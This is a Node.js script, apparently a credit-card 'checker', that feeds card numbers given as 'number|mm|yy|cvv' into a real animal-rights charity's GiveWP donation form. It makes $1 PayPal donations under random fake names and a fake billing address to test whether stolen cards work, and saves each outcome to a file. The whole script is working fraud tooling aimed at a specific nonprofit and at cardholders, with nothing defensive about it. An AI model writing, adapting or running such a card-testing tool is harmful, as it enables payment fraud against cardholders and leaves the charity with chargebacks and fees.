const fs = require('fs');
const cookieJar = new Map();

const randomString = (length) =>
    Array(length)
        .fill(0)
        .map(() => 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)])
        .join('');

async function request(url, options = {}) {
    const headers = new Headers(options.headers || {});
    const cookieString = Array.from(cookieJar)
        .map(([key, value]) => `\( {key}= \){value}`)
        .join('; ');

    if (cookieString) {
        headers.set('cookie', cookieString);
    }

    if (!headers.has('user-agent')) {
        headers.set(
            'user-agent',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
        );
    }

    const response = await fetch(url, { ...options, headers });

    // Handle Set-Cookie
    const setCookies = response.headers.getSetCookie?.() || [];
    for (const cookie of setCookies) {
        const [pair] = cookie.split(';');
        const [name, value] = pair.split('=').map(s => s.trim());
        if (name && value) cookieJar.set(name, value);
    }

    return response;
}

(async () => {
    const args = process.argv[2];

    if (!args) {
        console.error('Usage: node checker.js "number|mm|yy|cvv"');
        return;
    }

    const [number, month, yearShort, cvv] = args.split('|');
    const user = {
        firstName: randomString(6),
        lastName: randomString(6),
        email: `${randomString(10)}@outlook.com`,
    };

    try {
        const html = await (await request('https://animalrights.org.au/donate-now/')).text();
        const formUrlMatch = html.match(/data-form-view-url=['"]([^'"]+)['"]/);
        if (!formUrlMatch) throw new Error("Could not find data-form-view-url");

        const formUrl = formUrlMatch[1].replace(/&amp;/g, '&');
        const formResponse = await request(formUrl);
        const formText = await formResponse.text();
        const exportedMatch = formText.match(/window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});/);
        if (!exportedMatch) throw new Error("Could not find givewpDonationFormExports");

        const exported = exportedMatch[1];
        const data = JSON.parse(exported);

        const gateway = data.registeredGateways?.find((gateway) => gateway.id === 'paypal-commerce');
        if (!gateway) throw new Error("paypal-commerce gateway not found");

        const settings = gateway.settings;

        // Fetch PayPal Access Token
        const clientId = settings.sdkOptions?.clientId;
        if (!clientId) throw new Error("No PayPal clientId found");

        const auth = Buffer.from(`${clientId}:`).toString('base64');
        const tokenResponse = await request('https://api.paypal.com/v1/oauth2/token', {
            method: 'POST',
            headers: {
                'Authorization': `Basic ${auth}`,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json'
            },
            body: 'grant_type=client_credentials'
        });

        if (!tokenResponse.ok) {
            throw new Error(`PayPal auth failed: ${await tokenResponse.text()}`);
        }

        const tokenData = await tokenResponse.json();
        const accessToken = tokenData.access_token;
        if (!accessToken) throw new Error("No access_token received");

        const params = new URLSearchParams(new URL(data.donateUrl).search);
        const tokens = {
            formId: settings.donationFormId.toString(),
            formHash: settings.donationFormNonce,
            signature: params.get('givewp-route-signature'),
            signatureExpiration: params.get('givewp-route-signature-expiration'),
            signatureId: params.get('givewp-route-signature-id'),
        };

        const formData = new FormData();
        Object.entries({
            action: 'give_paypal_commerce_create_order',
            'give-form-id': tokens.formId,
            'give-form-hash': tokens.formHash,
            give_payment_mode: 'paypal-commerce',
            'give-amount': '1',
            give_first: user.firstName,
            give_last: user.lastName,
            give_email: user.email,
            'give-cs-form-currency': 'AUD',
            'give-gateway': 'paypal-commerce', // sometimes needed
        }).forEach(([key, value]) => formData.append(key, value));

        const orderResponse = await request('https://animalrights.org.au/wp-admin/admin-ajax.php', {
            method: 'POST',
            body: formData,
        });

        if (!orderResponse.ok) {
            const errText = await orderResponse.text();
            throw new Error(`GiveWP AJAX failed (${orderResponse.status}): ${errText.slice(0, 300)}`);
        }

        let orderData;
        try {
            orderData = await orderResponse.json();
        } catch (e) {
            const text = await orderResponse.text();
            throw new Error(`GiveWP response not JSON: ${text.slice(0, 200)}`);
        }

        // Extract orderId
        let orderId = null;
        if (orderData?.success === true) {
            if (typeof orderData.data === 'string' && orderData.data.length > 15) {
                orderId = orderData.data;
            } else if (orderData.data?.id) {
                orderId = orderData.data.id;
            } else if (orderData.data?.orderID) {
                orderId = orderData.data.orderID;
            } else if (orderData.data?.order?.id) {
                orderId = orderData.data.order.id;
            }
        }

        // Log full response for debugging
        console.log('GiveWP full response:', JSON.stringify(orderData, null, 2));

        if (!orderId) {
            throw new Error(
                `No PayPal order ID found in GiveWP response. ` +
                `Available keys: ${Object.keys(orderData).join(', ')}. ` +
                `See console for full JSON.`
            );
        }

        console.log(`Extracted PayPal Order ID: ${orderId}`);

        // Confirm payment source
        const expiry = `\( {month.padStart(2, '0')}/20 \){yearShort.padStart(2, '0')}`;
        let confirmResponse = await request(
            `https://api.paypal.com/v2/checkout/orders/${orderId}`,
            {
                method: 'PATCH',
                headers: {
                    authorization: `Bearer ${accessToken}`,
                    'content-type': 'application/json',
                },
                body: JSON.stringify([{
                    op: 'replace',
                    path: '/payment_source',
                    value: {
                        card: {
                            number,
                            security_code: cvv,
                            expiry,
                            name: `${user.firstName} ${user.lastName}`,
                            billing_address: {
                                address_line_1: '123 Sample Street',
                                admin_area_2: 'Indore',
                                admin_area_1: 'MP',
                                postal_code: '452001',
                                country_code: 'IN',
                            },
                        },
                    },
                }]),
            }
        );

        let confirmData;
        if (confirmResponse.ok) {
            // If PATCH worked, capture
            const captureResponse = await request(
                `https://api.paypal.com/v2/checkout/orders/${orderId}/capture`,
                {
                    method: 'POST',
                    headers: {
                        authorization: `Bearer ${accessToken}`,
                        'content-type': 'application/json',
                    },
                    body: JSON.stringify({}),
                }
            );
            confirmData = await captureResponse.json();
        } else {
            // Fallback to confirm-payment-source
            console.log('PATCH failed, trying confirm-payment-source...');
            confirmResponse = await request(
                `https://api.paypal.com/v2/checkout/orders/${orderId}/confirm-payment-source`,
                {
                    method: 'POST',
                    headers: {
                        authorization: `Bearer ${accessToken}`,
                        'content-type': 'application/json',
                    },
                    body: JSON.stringify({
                        payment_source: {
                            card: {
                                number,
                                security_code: cvv,
                                expiry,
                                name: `${user.firstName} ${user.lastName}`,
                            },
                        },
                    }),
                }
            );
            confirmData = await confirmResponse.json();
        }

        if (confirmData.status === 'APPROVED' || confirmData.status === 'COMPLETED') {
            const finalParams = new URLSearchParams({
                'givewp-route': 'donate',
                'givewp-route-signature': tokens.signature,
                'givewp-route-signature-id': tokens.signatureId,
                'givewp-route-signature-expiration': tokens.signatureExpiration,
            });

            const finalForm = new FormData();
            Object.entries({
                amount: '1',
                currency: 'AUD',
                donationType: 'single',
                formId: tokens.formId,
                gatewayId: 'paypal-commerce',
                firstName: user.firstName,
                lastName: user.lastName,
                email: user.email,
                anonymous: 'false',
                isEmbed: 'true',
                embedId: 'give-form-shortcode-1',
                locale: 'en_AU',
                'gatewayData[payPalOrderId]': orderId,
                originUrl: 'https://animalrights.org.au/donate-now/',
            }).forEach(([key, value]) => finalForm.append(key, value));

            const finalResponse = await request(`https://animalrights.org.au/?${finalParams}`, {
                method: 'POST',
                body: finalForm,
                headers: {
                    accept: 'application/json',
                    origin: 'https://animalrights.org.au',
                },
            });

            const finalText = await finalResponse.text();

            try {
                const finalJson = JSON.parse(finalText);
                console.log(JSON.stringify(finalJson, null, 2));
                fs.writeFileSync('result.txt', JSON.stringify(finalJson));
            } catch (error) {
                console.log(finalText);
                fs.writeFileSync('result.txt', finalText);
            }
        } else {
            console.log(JSON.stringify(confirmData, null, 2));
            fs.writeFileSync('result.txt', JSON.stringify(confirmData));
        }
    } catch (error) {
        console.error('Error:', error.message);
        fs.writeFileSync('result.txt', `Error: ${error.message}`);
    }
})();
